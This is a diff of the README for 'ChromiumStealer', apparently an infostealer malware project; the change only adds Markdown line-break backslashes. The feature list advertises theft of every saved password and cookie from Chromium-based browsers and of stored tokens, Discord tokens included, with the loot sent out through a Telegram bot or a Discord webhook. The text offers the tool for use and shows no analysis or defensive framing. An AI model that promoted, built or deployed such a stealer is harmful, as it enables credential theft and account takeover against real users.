@@ -1,11 +1,11 @@
 # ChromiumStealer
 # FEATURES
--STEALS all Passwords from all Chromium based Browsers
--STEALS all Cookies from all Chromium based Browsers
--GRABS all Tokens stored at the PC (supports discord newest "token encryption")
+-STEALS all Passwords from all Chromium based Browsers\
+-STEALS all Cookies from all Chromium based Browsers\
+-GRABS all Tokens stored at the PC (supports discord newest "token encryption")\
 
--RECEIVE the info via Telegram bot API
-and/or
+-RECEIVE the info via Telegram bot API\
+and/or\
 -RECEIVE the info via Discord webhook
 
 # EXAMPLE
